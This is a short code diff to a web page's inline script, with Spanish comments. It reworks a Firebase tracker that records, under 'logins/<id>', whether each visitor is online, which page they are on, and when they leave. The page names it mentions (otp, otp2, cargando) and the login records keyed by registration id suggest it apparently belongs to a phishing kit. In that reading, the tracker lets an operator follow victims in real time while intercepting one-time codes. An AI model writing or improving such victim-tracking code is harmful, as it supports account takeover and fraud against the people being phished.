@@ -2691,29 +2691,44 @@ gestionarPresencia(sessionId);
 	// ]]>
 </script>
 	<script>
-        // Agrega esto en index2.html, otp.html, otp2.html, cargando.html, cargando2.html
+       // Al cargar la página - marcar como ONLINE
 const id = new URLSearchParams(window.location.search).get('id') || localStorage.getItem('registro_id');
+const paginaActual = window.location.pathname.split('/').pop();
 
-function reportarEstado() {
-    const pagina = window.location.pathname.split('/').pop();
-    const online = document.visibilityState === 'visible';
+if (id && typeof firebase !== 'undefined') {
+    // Marcar online y la página actual
+    firebase.database().ref('logins/' + id).update({
+        online: true,
+        pagina: paginaActual,
+        ultimoPing: Date.now()
+    });
     
-    if (id && db) {
-        db.ref('logins/' + id).update({
-            pagina: pagina,
-            online: online,
+    // Ping cada 5 segundos para mantener vivo
+    setInterval(() => {
+        firebase.database().ref('logins/' + id).update({
+            online: true,
             ultimoPing: Date.now()
         });
-    }
+    }, 5000);
+    
+    // Cuando cierra o refresca la página - marcar OFF
+    window.addEventListener('beforeunload', () => {
+        firebase.database().ref('logins/' + id).update({
+            online: false,
+            pagina: 'SALIO',
+            ultimoPing: Date.now()
+        });
+    });
+    
+    // Cuando cambia visibilidad (minimiza/vuelve)
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') {
+            // Minimizó o cambió de pestaña - sigue LIVE pero actualizamos
+            firebase.database().ref('logins/' + id).update({
+                ultimoPing: Date.now()
+            });
+        }
+    });
 }
-
-// Reportar cada 3 segundos
-setInterval(reportarEstado, 3000);
-
-// Reportar cuando cambia visibilidad
-document.addEventListener('visibilitychange', reportarEstado);
-
-// Reportar al cargar
-reportarEstado();
     </script>
 </body></html>
